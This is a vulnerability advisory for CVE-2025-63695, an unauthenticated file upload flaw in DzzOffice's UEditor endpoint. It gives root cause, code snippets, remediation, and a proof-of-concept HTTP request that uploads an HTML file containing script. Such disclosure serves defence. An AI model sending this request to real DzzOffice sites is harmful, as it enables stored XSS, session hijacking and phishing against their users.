# CVE-2025-63695 Vulnerability Report

## Overview

- **CVE ID**: CVE-2025-63695
- **Vulnerability Type**: CWE-434 (Unrestricted Upload of File with Dangerous Type)
- **Affected Product**: DzzOffice
- **Affected Version**: v2.3.7 and before
- **CVSS Score**: 9.8 (Critical)

## Vulnerability Details

### Description

DzzOffice v2.3.7 and earlier versions contain an arbitrary file upload vulnerability in the UEditor component. The vulnerable endpoint `/dzz/system/ueditor/php/controller.php` allows unauthenticated users to upload files with dangerous extensions such as `.html`, `.js`, and `.css`.

### Root Cause

1. The `controller.php` file lacks authentication checks and `IN_DZZ` protection
2. The `config.json` file allows dangerous file types in `fileAllowFiles` configuration
3. Uploaded files are saved to a web-accessible directory and can be directly accessed

### Vulnerable Code

Location: `/dzz/system/ueditor/php/controller.php`

```php
$action = $_GET['action'];
switch ($action) {
    case 'uploadfile':
        $result = include("action_upload.php");
        break;
    // ...
}
```

The endpoint accepts requests without any authentication.

Configuration in `/dzz/system/ueditor/php/config.json`:

```json
"fileAllowFiles": [
    ".png", ".jpg", "...", ".html", ".js", ".css"
]
```

## Exploitation

### Attack Vector

1. Attacker sends a multipart POST request to the vulnerable endpoint
2. Uploads a malicious HTML file containing JavaScript code
3. Accesses the uploaded file directly via its URL
4. JavaScript code executes in the context of the DzzOffice domain

### PoC Request

```http
POST /dzz/system/ueditor/php/controller.php?action=uploadfile HTTP/1.1
Host: target.com
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary

------WebKitFormBoundary
Content-Disposition: form-data; name="upfile"; filename="poc.html"
Content-Type: text/html

<html>
<script>alert('XSS via File Upload')</script>
</html>
------WebKitFormBoundary--
```

### Response

```json
{
  "state": "SUCCESS",
  "url": "/ueditor/php/upload/file/20260203/1770126927974652.html",
  "title": "1770126927974652.html",
  "original": "poc.html",
  "type": ".html",
  "size": 233
}
```

## Impact

- **Stored XSS**: Attackers can upload malicious HTML/JS files to execute arbitrary JavaScript in victims' browsers
- **Session Hijacking**: Steal user session cookies
- **Phishing**: Create fake login pages on the target domain
- **Malware Distribution**: Host malicious content on a trusted domain

## Remediation

1. Add authentication checks to `controller.php`
2. Remove dangerous file types (`.html`, `.js`, `.css`) from `fileAllowFiles`
3. Implement proper file type validation based on content, not just extension
4. Store uploaded files outside the web root or with non-executable permissions

## Timeline

- **Vulnerability Published**: November 18, 2025
- **CVE Assigned**: CVE-2025-63695

## References

- https://github.com/zyx0814/dzzoffice
- https://github.com/Yohane-Mashiro/dzzoffice_upload
